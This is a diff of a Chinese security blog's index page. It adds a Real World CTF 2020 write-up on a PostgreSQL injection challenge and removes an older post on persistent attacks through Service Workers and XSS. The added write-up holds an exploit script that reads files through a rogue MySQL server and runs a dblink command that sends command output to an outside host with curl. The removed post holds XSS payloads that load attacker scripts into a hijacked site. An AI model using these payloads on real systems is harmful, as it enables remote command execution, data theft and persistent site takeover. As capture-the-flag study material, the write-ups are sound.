@@ -66,6 +66,120 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-real world ctf 2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/01/14/real%20world%20ctf%202020/" class="article-date">
+  <time class="dt-published" datetime="2021-01-14T06:02:02.063Z" itemprop="datePublished">2021-01-14</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/01/14/real%20world%20ctf%202020/">real world ctf 2020</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="Real-World-CTF-2020"><a href="#Real-World-CTF-2020" class="headerlink" title="Real World CTF 2020"></a>Real World CTF 2020</h1><p>比赛很棒，题目很好，我很菜</p>
+<h2 id="DBaaSadge"><a href="#DBaaSadge" class="headerlink" title="DBaaSadge"></a>DBaaSadge</h2><p>就一个PostgreSQL任意语句执行，给的权限不是superuser，但大部分操作是能进行的</p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+
+if(!$sql=(string)$_GET[&quot;sql&quot;]){
+  show_source(__FILE__);
+  die();
+}
+
+header(&#39;Content-Type: text/plain&#39;);
+
+if(strlen($sql)&gt;100){
+  die(&#39;That query is too long ;_;&#39;);
+}
+
+if(!pg_pconnect(&#39;dbname=postgres user=realuser&#39;)){
+  die(&#39;DB gone ;_;&#39;);
+}
+
+if($query = pg_query($sql)){
+  print_r(pg_fetch_all($query));
+} else {
+  die(&#39;._.?&#39;);
+}
+</code></pre>
+<p>题目提供了docker文件</p>
+<p>看下Dockerfile发现：</p>
+<pre><code>安装了postgresql-10-mysql-fdw
+还开启了dblink</code></pre><p>相关的介绍文章：</p>
+<p><a href="https://www.percona.com/blog/2018/08/21/foreign-data-wrappers-postgresql-postgres_fdw/" target="_blank" rel="noopener">https://www.percona.com/blog/2018/08/21/foreign-data-wrappers-postgresql-postgres_fdw/</a></p>
+<p><a href="https://www.postgresql.org/docs/10/contrib-dblink-function.html" target="_blank" rel="noopener">https://www.postgresql.org/docs/10/contrib-dblink-function.html</a></p>
+<p>一个是远程连接mysql，一个是远程连接postgresql 。</p>
+<p>mysql客户端有个非常有名的漏洞：<code>Load data local infile &#39;/etc/passwd&#39; into table proc;</code>，即客户端文件读取，利用<a href="https://github.com/allyshka/Rogue-MySql-Server" target="_blank" rel="noopener">https://github.com/allyshka/Rogue-MySql-Server</a> 搭建一个恶意mysql服务端成功读取到文件</p>
+<pre><code>CREATE SERVER q FOREIGN DATA WRAPPER mysql_fdw OPTIONS(host&#39;ccreater.top&#39;,port&#39;63306&#39;)
+CREATE USER MAPPING FOR realuser SERVER q OPTIONS (username &#39;a&#39;, password &#39;a&#39;);
+CREATE FOREIGN TABLE c (id int)SERVER q OPTIONS(dbname &#39;a&#39;,table_name &#39;a&#39;)
+select * from c</code></pre><p>结合dblink很自然的想到读取postgress数据库存储文件获得superuser密码再任意命令执行</p>
+<p>通过本地搭建环境获得数据库文件位置：/var/lib/postgresql/10/main/base</p>
+<p>已查找一下postgresql为关键词查找文件得到密码所在文件：</p>
+<p><code>/var/lib/postgresql/10/main/global/1260</code></p>
+<p>查找一下postgresql的加密规则：md5(password+username)</p>
+<p>exp.py</p>
+<pre><code class="python">
+import requests
+
+sqls=[
+      &quot;CREATE SERVER q FOREIGN DATA WRAPPER mysql_fdw OPTIONS(host&#39;ccreater.top&#39;,port&#39;63306&#39;)&quot;,
+      &quot;CREATE USER MAPPING FOR realuser SERVER q OPTIONS (username &#39;a&#39;, password &#39;a&#39;)&quot;,
+      &quot;CREATE FOREIGN TABLE c (id int)SERVER q OPTIONS(dbname &#39;a&#39;,table_name &#39;a&#39;)&quot;,
+      &quot;select * from c&quot;
+]
+sqls=[
+      &quot;select dblink(&#39;host=0 password=jpr5q&#39;,&#39;copy(select)to program&#39;&#39;curl y5pwcd.ceye.io/`/readflag`&#39;&#39;&#39;)&quot;
+]
+def hack(sql):
+      burp0_url = &quot;http://54.219.197.26:60080/&quot;
+      burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;, &quot;Connection&quot;: &quot;close&quot;}
+      r= requests.get(burp0_url, headers=burp0_headers,params={
+            &quot;sql&quot;:sql
+      })
+      print(r.text)
+
+for sql in sqls:
+      hack(sql)</code></pre>
+<p>rwctf{pop_cat_says_p1ea5e_upd4t3_youR_libmysqlclient_kekW}</p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="http://blog.ccreater.top/2021/01/14/real">http://blog.ccreater.top/2021/01/14/real</a> world ctf 2020/](<a href="http://blog.ccreater.top/2021/01/14/real">http://blog.ccreater.top/2021/01/14/real</a> world ctf 2020/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.ccreater.top/2021/01/14/real%20world%20ctf%202020/" data-id="ckjwg4j4i0000xgvdd67hgmvm" data-title="real world ctf 2020" class="article-share-link">Share</a>
+      
+	  
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+
+  
     <article id="post-2020xnuca_ezwp题解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2020/12/14/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/" class="article-date">
@@ -2279,177 +2393,6 @@ function fuck(){
 
 
   
-    <article id="post-Service Worker" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/10/15/Service%20Worker/" class="article-date">
-  <time class="dt-published" datetime="2020-10-15T14:26:21.294Z" itemprop="datePublished">2020-10-15</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/web/">web</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/10/15/Service%20Worker/">Service Worker</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="Service-Worker"><a href="#Service-Worker" class="headerlink" title="Service Worker"></a>Service Worker</h1><h2 id="Service-Worker-学习"><a href="#Service-Worker-学习" class="headerlink" title="Service Worker 学习"></a>Service Worker 学习</h2><h3 id="配置检查"><a href="#配置检查" class="headerlink" title="配置检查"></a>配置检查</h3><p>在已经支持 serivce workers 的浏览器的版本中，很多特性没有默认开启。如果你发现示例代码在当前版本的浏览器中怎么样都无法正常运行，你可能需要开启一下浏览器的相关配置：</p>
-<ul>
-<li><strong>Firefox Nightly</strong>: 访问 <code>about:config</code> 并设置 <code>dom.serviceWorkers.enabled</code> 的值为 true; 重启浏览器；</li>
-<li><strong>Chrome Canary</strong>: 访问 <code>chrome://flags</code> 并开启 <code>experimental-web-platform-features</code>; 重启浏览器 (注意：有些特性在Chrome中没有默认开放支持)；</li>
-<li><strong>Opera</strong>: 访问 <code>opera://flags</code> 并开启<code>ServiceWorker 的支持</code>; 重启浏览器。 </li>
-</ul>
-<p>另外，你需要通过 HTTPS 来访问你的页面 — 出于安全原因，<strong>Service Workers 要求必须在 HTTPS 下才能运行。Github 是个用来测试的好地方，因为它就支持HTTPS。为了便于本地开发，<code>localhost</code> 也被浏览器认为是安全源。</strong></p>
-<h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><ol>
-<li>Service Workers 要求必须在 HTTPS 或者 localhost 下才能运行</li>
-<li>Service Workers 要求尽可能的异步操作</li>
-</ol>
-<h3 id="Service-Workers-的注册及安装"><a href="#Service-Workers-的注册及安装" class="headerlink" title="Service Workers 的注册及安装"></a>Service Workers 的注册及安装</h3><p>通过<code>serviceWorkerContainer.register()</code>来注册一个Service Workers</p>
-<p>eg.</p>
-<pre><code class="javascript">if (&#39;serviceWorker&#39; in navigator) {
-  navigator.serviceWorker.register(&#39;/sw-test/sw.js&#39;, { scope: &#39;/sw-test/&#39; }).then(function(reg) {
-    // registration worked
-    console.log(&#39;Registration succeeded. Scope is &#39; + reg.scope);
-  }).catch(function(error) {
-    // registration failed
-    console.log(&#39;Registration failed with &#39; + error);
-  });
-}</code></pre>
-<p>其中scope为Service Workers的作用域，默认是scriptURL(<code>/sw-test/sw.js</code>)所在的文件夹及其子文件夹，scope的选择范围只能是scriptURL所在的文件夹或者子文件夹，且不能影响其他网站，只能影响当前的域名。</p>
-<p>scriptURL是相对于origin的URL而不是相对于引用他的那个JS文件，当然也有例外（ <code>Content-Type</code> 必须是 <code>text/javascript</code>）</p>
-<blockquote>
-<p>如果你的 service worker 被激活在一个有 <code>Service-Worker-Allowed</code> header 的客户端，你可以为service worker 指定一个最大的 scope 的列表。</p>
-</blockquote>
-<p>安装过程：</p>
-<p><img src="https://mdn.mozillademos.org/files/12636/sw-lifecycle.png" alt="image1496"></p>
-<h3 id="处理事件"><a href="#处理事件" class="headerlink" title="处理事件"></a>处理事件</h3><p>Service Workers支持的事件如下</p>
-<p><img src="https://mdn.mozillademos.org/files/12632/sw-events.png" alt="image1603"></p>
-<p>install:安装时会触发InstallEvent</p>
-<p>activate:安装事件之后调用activate事件</p>
-<p>fetch:Service Workers 中的所有请求都会触发fetch事件</p>
-<p>sync:当发起一个同步请求是会触发sync事件</p>
-<pre><code class="javascript">this.addEventListener(&#39;install&#39;, function(event) {
-  event.waitUntil(
-    caches.open(&#39;v1&#39;).then(function(cache) {
-      return cache.addAll([
-        &#39;/sw-test/&#39;,
-        &#39;/sw-test/index.html&#39;,
-        &#39;/sw-test/style.css&#39;,
-        &#39;/sw-test/app.js&#39;,
-        &#39;/sw-test/image-list.js&#39;,
-        &#39;/sw-test/star-wars-logo.jpg&#39;,
-        &#39;/sw-test/gallery/&#39;,
-        &#39;/sw-test/gallery/bountyHunters.jpg&#39;,
-        &#39;/sw-test/gallery/myLittleVader.jpg&#39;,
-        &#39;/sw-test/gallery/snowTroopers.jpg&#39;
-      ]);
-    })
-  );
-});
-
-self.addEventListener(&#39;activate&#39;, function(event) {
-  var cacheWhitelist = [&#39;v2&#39;];
-
-  event.waitUntil(
-    caches.keys().then(function(keyList) {
-      return Promise.all(keyList.map(function(key) {
-        if (cacheWhitelist.indexOf(key) === -1) {
-          return caches.delete(key);
-        }
-      }));
-    })
-  );
-});
-
-self.addEventListener(&#39;fetch&#39;, function(event) {
-  event.respondWith(
-    caches.match(event.request).then(function(resp) {
-      return resp || fetch(event.request).then(function(response) {
-        return caches.open(&#39;v1&#39;).then(function(cache) {
-          cache.put(event.request, response.clone());
-          return response;
-        });  
-      });
-    })
-  );
-});</code></pre>
-<h2 id="Service-Worker-With-XSS"><a href="#Service-Worker-With-XSS" class="headerlink" title="Service Worker With XSS"></a>Service Worker With XSS</h2><h3 id="XSS简单示范"><a href="#XSS简单示范" class="headerlink" title="XSS简单示范"></a>XSS简单示范</h3><p>通过Service Worker 可以持久的控制受害者</p>
-<p>利用条件如下：</p>
-<ol>
-<li>一个xss点</li>
-<li>MIME TYPE 为 application/javascript的可控页面（通常是jsonp）</li>
-</ol>
-<p><code>index.php?xss=navigator.serviceWorker.register(&quot;/sw/jsonp.php?xss=importScripts(%27https://serviceworker.free.beeceptor.com/exp.js%27);&quot;);</code></p>
-<p>exp.js</p>
-<pre><code>self.addEventListener(&#39;fetch&#39;, function(event) {
-  event.respondWith(new Response(&#39;&lt;h1 style=&quot;color:red&quot;&gt;HACKED&lt;/h1&gt;&#39;,{headers: { &#39;Content-Type&#39;: &#39;text/html&#39; }}));
-});</code></pre><h3 id="利用Service-Workers-控制主站及其子站点"><a href="#利用Service-Workers-控制主站及其子站点" class="headerlink" title="利用Service Workers 控制主站及其子站点"></a>利用Service Workers 控制主站及其子站点</h3><p>假设在A.evil.com上存在XSS点，B.evil.com上存在可控jsonp，</p>
-<p>那么我们可以通过设置<code>document.domain=&quot;evil.com&quot;</code>，嵌入一个iframe（src=B.evil.com），然后执行恶意代码插入Service Workers</p>
-<p>A站点执行(使用self.skipWaiting()使的Service Workes 控制当前界面)</p>
-<pre><code class="javascript">document.domain=&quot;evil.com&quot;;
-a=document.createElement(&quot;iframe&quot;);
-a.src=&quot;https://B.evil.com/&quot;;
-document.body.append(a);
-document.getElementsByTagName(&quot;iframe&quot;)[0].addEventListener(&quot;load&quot;,()=&gt;{fuck()})
-function fuck(){
-    var code = `navigator.serviceWorker.register(&quot;/jsonp.php?callback=self.importScripts(&#39;//mysite.com/fuck.js&#39;)//&quot;)`;
-    document.getElementsByTagName(&quot;iframe&quot;)[0].contentWindow.eval(code);
-}
-</code></pre>
-<p>这样我们便控制住了B站点</p>
-<p>fuck.js</p>
-<pre><code class="javascript">document.domain=&quot;hardxss.xhlj.wetolink.com&quot;;
-a=document.createElement(&quot;iframe&quot;);
-a.src=&quot;https://auth.hardxss.xhlj.wetolink.com&quot;;
-document.body.append(a);
-document.getElementsByTagName(&quot;iframe&quot;)[0].addEventListener(&quot;load&quot;,()=&gt;{fuck()})
-function fuck(){
-    var code = `navigator.serviceWorker.register(&quot;/api/loginStatus?callback=self.importScripts(&#39;//serviceworker.free.beeceptor.com/exp.js&#39;);//&quot;)`;
-    document.getElementsByTagName(&quot;iframe&quot;)[0].contentWindow.eval(code);
-}
-</code></pre>
-<p>exp.js</p>
-<pre><code>self.addEventListener(&#39;fetch&#39;, function(event) {
-  event.respondWith(new Response(&#39;&lt;h1 style=&quot;color:red&quot;&gt;HACKED&lt;/h1&gt;&#39;,{headers: { &#39;Content-Type&#39;: &#39;text/html&#39; }}));
-});
-
-</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>教程：<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API/Using_Service_Workers" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API/Using_Service_Workers</a></p>
-<p>API：<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API</a></p>
-<p><a href="https://lightless.me/archives/XSS-With-Service-Worker.html" target="_blank" rel="noopener">https://lightless.me/archives/XSS-With-Service-Worker.html</a></p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="http://blog.ccreater.top/2020/10/15/Service">http://blog.ccreater.top/2020/10/15/Service</a> Worker/](<a href="http://blog.ccreater.top/2020/10/15/Service">http://blog.ccreater.top/2020/10/15/Service</a> Worker/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/10/15/Service%20Worker/" data-id="ckgax2liq0000zkvddwnd0ibu" data-title="Service Worker" class="article-share-link">Share</a>
-      
-	  
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/" rel="tag">xss</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -2494,7 +2437,7 @@ function fuck(){
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
     </div>
   </div>
 
@@ -2505,6 +2448,10 @@ function fuck(){
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2021/01/14/real%20world%20ctf%202020/">real world ctf 2020</a>
+          </li>
         
           <li>
             <a href="/2020/12/14/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/">2020xnuca_ezwp题解</a>
@@ -2522,10 +2469,6 @@ function fuck(){
             <a href="/2020/11/13/XNUCA_2020_oooooooldjs%E9%A2%98%E8%A7%A3/">XNUCA_2020_oooooooldjs题解</a>
           </li>
         
-          <li>
-            <a href="/2020/11/12/Academy_write_up/">Academy_write_up</a>
-          </li>
-        
       </ul>
     </div>
   </div>
@@ -2538,7 +2481,7 @@ function fuck(){
   
   <div class="outer">
     <div id="footer-info" class="inner">
-      &copy; 2020 ccreater<br>
+      &copy; 2021 ccreater<br>
       Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
     </div>
   </div>
